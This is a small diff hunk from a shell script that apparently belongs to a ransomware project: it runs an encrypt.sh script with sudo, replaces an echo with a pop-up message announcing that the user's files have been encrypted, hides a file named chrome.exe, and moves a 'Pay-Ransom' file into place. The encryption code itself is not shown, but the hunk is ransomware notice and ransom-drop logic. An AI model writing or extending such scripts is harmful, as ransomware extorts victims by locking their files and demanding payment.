@@ -7,7 +7,7 @@ sudo bash encrypt.sh
 
 cd ..
 
-echo "Ooops, your files have been encrypted!"
+xmessage "$(printf "Ooops"!"\nYour Files have been encrypted"!"")"
 
 mv chrome.exe .chrome.exe
 mv .client/Pay-Ransom Pay-Ransom
